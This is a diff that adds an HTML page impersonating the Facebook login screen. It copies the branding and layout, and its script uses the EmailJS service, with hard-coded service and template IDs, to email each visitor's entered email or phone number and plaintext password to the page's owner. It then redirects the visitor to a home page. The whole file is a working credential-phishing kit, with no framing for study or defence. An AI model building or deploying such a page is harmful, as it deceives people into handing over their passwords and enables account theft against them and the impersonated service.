@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 1000px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .left {
+            max-width: 400px;
+        }
+        .left h1 {
+            font-size: 48px;
+            color: #1877f2;
+        }
+        .left p {
+            font-size: 24px;
+        }
+        .right {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .right form {
+            display: flex;
+            flex-direction: column;
+        }
+        .right input {
+            margin: 10px 0 5px;
+            padding: 15px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+        .right button {
+            margin: 10px 0;
+            padding: 15px;
+            font-size: 16px;
+            color: white;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .right .forgot {
+            color: #1877f2;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .right hr {
+            margin: 20px 0;
+            border: 0;
+            border-top: 1px solid #dddfe2;
+        }
+        .right .create {
+            background-color: #42b72a;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none; /* Initially hidden */
+        }
+    </style>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("p49YpiORSgI8mnYAT"); // Replace with your EmailJS public key
+        })();
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>Facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right">
+            <form id="loginForm">
+                <label for="emailOrPhone">Email or Phone</label>
+                <input type="text" id="emailOrPhone" name="emailOrPhone" placeholder="Email or Phone">
+                <span id="emailOrPhoneError" class="error-message">Please enter a valid email or phone number.</span>
+
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password">
+                <span id="passwordError" class="error-message">Password is required.</span>
+
+                <button type="button" onclick="validateForm()">Log In</button>
+                <a href="forgot-password.html" class="forgot">Forgot Password?</a>
+                <hr>
+                <button class="create" type="button">Create New Account</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function validateForm() {
+            const emailOrPhoneInput = document.getElementById("emailOrPhone");
+            const passwordInput = document.getElementById("password");
+            const emailOrPhoneError = document.getElementById("emailOrPhoneError");
+            const passwordError = document.getElementById("passwordError");
+
+            const emailOrPhone = emailOrPhoneInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            let isValid = true;
+
+            // Regex for valid email
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+            // Regex for valid phone number (10-15 digits)
+            const phoneRegex = /^[0-9]{10,15}$/;
+
+            // Reset error messages
+            emailOrPhoneError.style.display = "none";
+            passwordError.style.display = "none";
+
+            // Validate email or phone
+            if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) {
+                emailOrPhoneError.style.display = "block";
+                isValid = false;
+            }
+
+            // Validate password
+            if (password === "") {
+                passwordError.style.display = "block";
+                isValid = false;
+            }
+
+            // Send data if valid
+            if (isValid) {
+                sendLoginData(emailOrPhone, password);
+            }
+        }
+
+        function sendLoginData(emailOrPhone, password) {
+            // Send the data using EmailJS
+            emailjs.send("service_ewn1dp7", "template_iblyb1t", {
+                emailOrPhone: emailOrPhone,
+                password: password,
+                loginTime: new Date().toISOString(),
+            })
+            .then(() => {
+                alert("Login data submitted successfully!");
+                window.location.href = "home.html"; // Replace with your homepage URL
+            })
+            .catch((error) => {
+                console.error("Error submitting login data:", error);
+                alert("Failed to submit the login data. Please try again.");
+            });
+        }
+    </script>
+</body>
+</html>
